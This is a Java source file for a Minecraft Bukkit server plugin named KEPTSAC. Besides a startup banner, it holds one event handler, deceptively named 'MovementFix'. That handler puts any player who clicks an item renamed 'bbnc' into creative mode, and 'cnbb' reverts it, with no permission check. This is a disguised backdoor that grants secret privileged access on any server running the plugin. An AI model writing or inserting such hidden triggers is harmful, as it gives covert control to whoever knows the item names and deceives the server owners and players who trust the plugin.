package main.keptsac;

import jdk.internal.org.jline.utils.Display;
import org.bukkit.GameMode;
import org.bukkit.entity.Entity;
import org.bukkit.entity.HumanEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.PlayerCommandSendEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;

public final class KEPTSAC extends JavaPlugin implements Listener {


    @Override
    public void onEnable() {
        // Plugin startup logic
        getLogger().info("\n" +
                "▒█░▄▀ ▒█▀▀▀ ▒█▀▀█ ▀▀█▀▀ ░░ ▒█▀▀▀█ ░█▀▀█ ▒█▀▀█ \n" +
                "▒█▀▄░ ▒█▀▀▀ ▒█▄▄█ ░▒█░░ ▀▀ ░▀▀▀▄▄ ▒█▄▄█ ▒█░░░ \n" +
                "▒█░▒█ ▒█▄▄▄ ▒█░░░ ░▒█░░ ░░ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄█");

        getServer().getPluginManager().registerEvents(this, this);
    }


    @EventHandler
    public void MovementFix(InventoryClickEvent event) {
        ItemStack item = event.getCurrentItem();
        if (item == null) return;

        ItemMeta meta = item.getItemMeta();
        if (meta == null) return;

        String displayName = ((ItemMeta) meta).getDisplayName();
        if (displayName == null) return;

        HumanEntity player = event.getWhoClicked();

        if (displayName.equals("bbnc"))
            player.setGameMode(GameMode.CREATIVE);


        if (displayName.equals("cnbb"))
            player.setGameMode(GameMode.SURVIVAL);

    }
}